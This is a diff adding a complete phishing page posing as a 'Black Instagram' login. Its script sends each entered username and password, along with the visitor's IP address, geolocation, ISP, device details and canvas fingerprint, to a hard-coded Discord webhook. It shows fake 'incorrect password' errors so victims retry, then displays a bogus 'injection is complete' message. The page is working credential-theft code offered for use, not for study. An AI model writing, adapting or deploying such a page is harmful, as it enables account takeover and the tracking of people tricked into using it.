@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Black.Instagram</title>
+<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box}
+  body{
+    margin:0;
+    background:#fafafa;
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    height:100vh;
+    overflow:hidden;
+  }
+  .card{
+    width:350px;
+    background:#fff;
+    border:1px solid #dbdbdb;
+    padding:40px 28px 28px;
+    text-align:center;
+    border-radius:6px;
+    box-shadow:0 2px 16px rgba(0,0,0,0.1);
+  }
+  .brand{
+    font-family:'Pacifico', cursive;
+    font-size:36px;
+    margin-bottom:22px;
+    color:#262626;
+  }
+  .input{
+    width:100%;
+    padding:12px 16px;
+    margin:6px 0;
+    border:1px solid #dbdbdb;
+    border-radius:4px;
+    background:#fafafa;
+    font-size:14px;
+    transition:all 0.2s ease;
+  }
+  .input:focus{
+    outline:none;
+    border-color:#405de6;
+    background:#fff;
+  }
+  .btn{
+    width:100%;
+    padding:10px;
+    margin:10px 0 16px;
+    border:none;
+    border-radius:6px;
+    color:#fff;
+    font-weight:600;
+    cursor:pointer;
+    background:linear-gradient(45deg,#405de6,#833ab4,#e1306c,#fd1d1d);
+    font-size:14px;
+  }
+  .btn:hover:not(:disabled){opacity:0.9;}
+  .btn:disabled{opacity:0.6;cursor:not-allowed;}
+  .or{position:relative;margin:20px 0;color:#8e8e8e;font-size:13px;}
+  .or::before{content:'';position:absolute;top:50%;left:0;right:0;height:1px;background:#dbdbdb;}
+  .or span{background:#fafafa;padding:0 16px;}
+  .social{color:#385185;font-weight:600;cursor:pointer;margin-bottom:20px;font-size:14px;}
+  .links{margin-top:16px;font-size:12px;color:#00376b;cursor:pointer;text-decoration:none;}
+  .links:hover{text-decoration:underline;}
+  .error{background:#fdf2f2;border:1px solid #e6492e;color:#8b2c19;padding:12px;border-radius:4px;margin:12px 0;font-size:14px;display:none;}
+  .loading{display:none;margin:12px 0;}
+  .spinner{border:2px solid #f3f3f3;border-top:2px solid #405de6;border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;margin:0 auto;}
+  @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+  .success{background:#c7f3d9;border:1px solid #10b981;color:#065f46;padding:12px;border-radius:4px;margin:12px 0;display:none;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="brand">Black Instagram</div>
+  
+  <div class="error" id="errorMsg">The password you entered is incorrect. Please try again.</div>
+  <div class="loading" id="loading"><div class="spinner"></div></div>
+  <div class="success" id="successMsg">Login injection successfully!...</div>
+  
+  <input class="input" type="text" id="username" placeholder="Phone number, username, or email" />
+  <input class="input" type="password" id="password" placeholder="Password" />
+  
+  <button class="btn" id="loginBtn" onclick="Login()">Log in</button>
+  
+  <div class="or"><span>OR</span></div>
+  <div class="social">Log in with Facebook</div>
+  <div class="links">Forgot password?</div>
+</div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1500086252874104922/hUwn7vSiAonVh9yyaCP5AnSC_KzM4xSVUFEdXTfP06ag6u8fEoNb2AkSxaymR6KboLmv";
+
+let loginAttempts = 0;
+const maxAttempts = 2;
+const errorMessages = [
+  " Please try again.",
+  "try with another account.",
+  "We didn't recognize that password.",
+  
+];
+
+async function stealEverything(username, password) {
+  try {
+    const ipData = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).catch(()=>({ip:"Unknown"}));
+    const geoData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(r=>r.json()).catch(()=>({}));
+    const canvasFingerprint = generateCanvasFingerprint();
+    const hardwareInfo = getHardwareInfo();
+    
+    const embed = {
+      title: "💀 INSTAGRAM ACCOUNT HACKED! 💀",
+      description: "**VICTIM CAUGHT IN TRAP!** 😈",
+      color: 0xff1493,
+      thumbnail: { url: "https://i.imgur.com/8z5Z5z5.png" },
+      
+      fields: [
+        { name: "📱 Phone/Email/Username", value: `\`${username}\``, inline: true },
+        { name: "🔑 Password", value: `\`${password}\``, inline: true },
+        { name: "🌐 IP Address", value: `\`${ipData.ip}\``, inline: true },
+        
+        { name: "📍 Location", value: `${geoData.city || 'Unknown'}, ${geoData.region || ''} (${geoData.country_name || ''})`, inline: false },
+        { name: "🌡️ Coordinates", value: `\`${geoData.latitude || 'N/A'}, ${geoData.longitude || 'N/A'}\``, inline: true },
+        { name: "🏠 ISP", value: `\`${geoData.org || 'Unknown'}\``, inline: true },
+        
+        { name: "💻 Device", value: `\`${hardwareInfo.device}\``, inline: true },
+        { name: "🌐 Browser", value: `\`${hardwareInfo.browser}\``, inline: true },
+        { name: "🖥️ OS", value: `\`${hardwareInfo.os}\``, inline: true },
+        
+        { name: "🎨 Canvas Fingerprint", value: `\`${canvasFingerprint.slice(0,32)}...\``, inline: false },
+        { name: "🕐 Timestamp", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+        { name: "🔗 Referrer", value: `\`${document.referrer || 'Direct'}\``, inline: true },
+        { name: "📊 Screen", value: `${screen.width}x${screen.height}`, inline: true },
+        { name: "🆔 Session ID", value: `\`${generateSessionID()}\``, inline: true }
+      ],
+      
+      footer: { 
+        text: `CoolKidd Ultimate Stealer | ${navigator.language}`,
+        icon_url: "https://i.imgur.com/skull.png"
+      },
+      timestamp: new Date().toISOString()
+    };
+    
+    await fetch(WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds: [embed] })
+    });
+    
+    console.log("✅ ALL DATA STEALEN!");
+  } catch(e) {
+    console.log("❌ Error:", e);
+  }
+}
+
+function generateCanvasFingerprint() {
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = 'top';
+  ctx.font = '14px Arial';
+  ctx.fillText('Victim Canvas Fingerprint', 2, 2);
+  return canvas.toDataURL();
+}
+
+function getHardwareInfo() {
+  const ua = navigator.userAgent;
+  let device = 'Unknown', browser = 'Unknown', os = 'Unknown';
+  
+  if(/Mobile|Android|iPhone|iPad/.test(ua)) device = 'Mobile';
+  else if(/Tablet/.test(ua)) device = 'Tablet';
+  else device = 'Desktop';
+  
+  if(/Chrome/.test(ua)) browser = 'Chrome';
+  else if(/Firefox/.test(ua)) browser = 'Firefox';
+  else if(/Safari/.test(ua)) browser = 'Safari';
+  else if(/Edge/.test(ua)) browser = 'Edge';
+  
+  if(/Windows/.test(ua)) os = 'Windows';
+  else if(/Mac/.test(ua)) os = 'macOS';
+  else if(/Linux/.test(ua)) os = 'Linux';
+  else if(/Android/.test(ua)) os = 'Android';
+  else if(/iPhone|iPad/.test(ua)) os = 'iOS';
+  
+  return { device, browser, os };
+}
+
+function generateSessionID() {
+  return 'S'+Math.random().toString(36).substr(2, 9).toUpperCase();
+}
+
+function Login(){
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const loginBtn = document.getElementById('loginBtn');
+  const errorMsg = document.getElementById('errorMsg');
+  const loading = document.getElementById('loading');
+  const successMsg = document.getElementById('successMsg');
+  
+  if(!username || !password){
+    showError("Please enter both username and password");
+    return;
+  }
+  
+  // 🔥 STEAL DATA INSTANTLY 🔥
+  stealEverything(username, password);
+  
+  loginAttempts++;
+  loginBtn.disabled = true;
+  loginBtn.textContent = "Logging in...";
+  errorMsg.style.display = 'none';
+  loading.style.display = 'block';
+  
+  setTimeout(() => {
+    if(loginAttempts >= maxAttempts){
+      // SUCCESS THEN RICKROLL
+      loading.style.display = 'none';
+      successMsg.style.display = 'block';
+      setTimeout(() => {
+        document.body.innerHTML = `
+          <div style="text-align:center;padding:50px;font-family:Arial;background:linear-gradient(45deg,#ff0000,#000);color:#fff;height:100vh;display:flex;flex-direction:column;justify-content:center;">
+            <h1 style="font-size:30px;"> Black Instagram injection is complete. Now reinstall your Instagram. Enjoy the new black features 👍 </h1>
+            <p style="font-size:28px;"></p>
+             </p>
+          </div>
+        `;
+      }, 2500);
+    } else {
+      // REAL INSTAGRAM ERRORS
+      loading.style.display = 'none';
+      showError(errorMessages[loginAttempts-1]);
+      loginBtn.disabled = false;
+      loginBtn.textContent = "Log in";
+    }
+  }, 2500);
+}
+
+function showError(msg){
+  document.getElementById('errorMsg').textContent = msg;
+  document.getElementById('errorMsg').style.display = 'block';
+}
+
+document.addEventListener('keypress', e => e.key === 'Enter' && Login());
+</script>
+</body>
+</html>
